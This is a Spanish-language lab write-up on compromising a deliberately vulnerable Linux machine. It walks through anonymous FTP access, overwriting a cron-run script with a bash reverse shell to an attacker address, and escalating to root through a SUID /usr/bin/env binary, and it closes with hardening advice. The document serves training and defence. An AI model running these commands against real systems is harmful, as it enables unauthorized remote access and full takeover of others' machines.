# Este repositorio documenta el proceso de explotación de una máquina Linux vulnerable que permite acceso anónimo por FTP, leading to remote code execution (RCE) y escalada de privilegios mediante binarios SUID.

## 1. Objetivos
  -  Demostrar los riesgos de habilitar FTP Anonymous.

  -  Explotar un script malicioso para ganar acceso inicial.

  -  Escalar privilegios abusando de permisos SUID.

## 2.  Audiencia
  -  🛡️ Pentesters y entusiastas de seguridad que buscan practicar:

    -  Enumeración de servicios.

    -  Manipulación de archivos vía FTP.

    -  Técnicas de post-explotación (TTY, PrivEsc).

##  Advertencia
  -  ⚠️ Úsalo solo en entornos autorizados. La explotación no consentida es ilegal.

# **Explotación de Máquina Linux vía FTP Anonymous**  

**Nivel de Dificultad**: Fácil  
**Técnicas usadas**: FTP Anonymous, Manipulación de Scripts, Reverse Shell, Escalada de Privilegios (SUID)  

---

## **Descubrimiento y Enumeración**  

### **1. Escaneo Inicial con Nmap**  
Identificamos los servicios expuestos en la máquina objetivo (`10.0.2.9`):  
```bash
nmap -sV -p- --min-rate 5000 -n -Pn 10.0.2.9 -oN nmap_scan
```  
**Resultados clave**:  
- **Puerto 21/tcp (FTP)**: Servicio **vsftpd** con acceso **Anonymous** habilitado.  

---

## **Explotación del FTP Anonymous**  

### **2. Conexión al Servicio FTP**  
Accedemos sin credenciales (usuario `anonymous`):  
```bash
ftp 10.0.2.9
```  
- **Usuario**: `anonymous`  
- **Contraseña**: (cualquier texto o vacío).  

### **3. Enumeración de Archivos**  
Listamos directorios y encontramos un script sospechoso:  
```bash
ls -la
cd scripts
get clean.sh  # Descargamos el archivo para analizarlo.
```  

### **4. Análisis del Script `clean.sh`**  
Inspeccionamos su contenido:  
```bash
cat clean.sh
```  
**Contenido original**:  
```bash
#!/bin/bash
rm -rf /tmp/logs/*  # Elimina logs temporales.
```  

### **5. Inyección de Reverse Shell**  
Modificamos `clean.sh` para incluir un payload de conexión reversa:  
```bash
echo "bash -i >& /dev/tcp/10.0.2.4/4444 0>&1" > clean.sh
```  

### **6. Subida del Archivo Malicioso**  
Sobrescribimos el script en el servidor:  
```bash
put clean.sh
```  

---

## **Ganando Acceso Inicial**  

### **7. Escucha con Netcat**  
Preparamos una sesión en nuestra máquina para recibir la shell:  
```bash
nc -lvnp 4444
```  

### **8. Ejecución Remota del Script**  
- Si el script se ejecuta automáticamente (ej: tarea cron), obtendremos shell.  
- Si no, esperamos a que un administrador lo ejecute manualmente.  

**¡Shell obtenida!**  

---

## **Post-Explotación**  

### **9. Mejora de la Shell**  
Convertimos la shell en interactiva:  
```bash
script /dev/null -c bash
Ctrl + Z  # Segundo plano
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```  

### **10. Escalada de Privilegios (SUID)**  

#### **Búsqueda de Binarios Vulnerables**  
```bash
find / -perm -4000 2>/dev/null
```  
**Resultado sospechoso**:  
- `/usr/bin/env` (permite ejecución arbitraria).  

#### **Explotación con `env`**  
Ejecutamos una shell como **root**:  
```bash
/usr/bin/env /bin/sh -p
```  
**¡Somos root!**  

---

## **Recolección de Flags**  

- **Flag de usuario**:  
  ```bash
  cat /home/usuario/user.txt
  ```  
- **Flag de root**:  
  ```bash
  cat /root/root.txt
  ```  

---

## **Conclusión y Recomendaciones**  

### **Vulnerabilidades Explotadas**  
1. **FTP Anonymous**: Permitió subir un script malicioso.  
2. **Tarea Cron o Ejecución Manual**: Ejecutó el payload.  
3. **Binario SUID (`/usr/bin/env`)**: Permitió escalar a root.  

### **Recomendaciones de Seguridad**  
✅ **Deshabilitar FTP Anonymous** en `/etc/vsftpd.conf`:  
   ```ini
   anonymous_enable=NO
   ```  
✅ **Restringir permisos SUID** innecesarios:  
   ```bash
   chmod -s /usr/bin/env
   ```  
✅ **Monitorear tareas Cron** y scripts automatizados.  

---

## **Referencias**  
- [GTFOBins: env](https://gtfobins.github.io/gtfobins/env/)  
- [Nmap Cheat Sheet](https://nmap.org/book/man.html)  
